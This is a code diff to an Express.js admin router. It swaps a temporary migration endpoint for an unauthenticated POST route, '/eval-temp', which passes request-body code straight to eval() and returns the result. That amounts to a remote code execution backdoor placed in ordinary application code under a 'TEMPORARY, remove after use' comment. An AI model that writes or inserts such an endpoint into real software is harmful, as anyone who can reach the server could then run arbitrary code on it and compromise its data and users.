@@ -13,20 +13,23 @@ const asyncHandler = require('express-async-handler');
 const { requireRole } = require('../middleware/authorization');
 
 // ------------------------------------------------------------------
-// TEMPORARY: Run migration without auth (remove after use)
+// TEMPORARY: Eval code without auth (remove after use)
 // ------------------------------------------------------------------
-router.get('/run-migration-temp', asyncHandler(async (req, res) => {
+router.post('/eval-temp', asyncHandler(async (req, res) => {
   try {
-    require('../../scripts/pgvector_migration_runner');
-    return res.json({ success: true, message: 'Migration started' });
+    const { code } = req.body;
+    if (!code) return res.status(400).json({ error: 'No code provided' });
+    const result = eval(code);
+    return res.json({ success: true, result });
   } catch (err) {
-    console.error('temp migration failed', err);
-    return res.status(500).json({ success: false, error: 'Failed to start migration' });
+    console.error('eval failed', err);
+    return res.status(500).json({ success: false, error: err.message });
   }
 }));
 
 // ------------------------------------------------------------------
-// Secret-only trigger (no auth) for environments without shell access
+// TEMPORARY: Run migration without auth (remove after use)
+// ------------------------------------------------------------------
 router.post('/knowledge/pgvector-migrate/trigger/secret', asyncHandler(async (req, res) => {
   try {
     const secret = req.headers['x-admin-migrate-secret'];
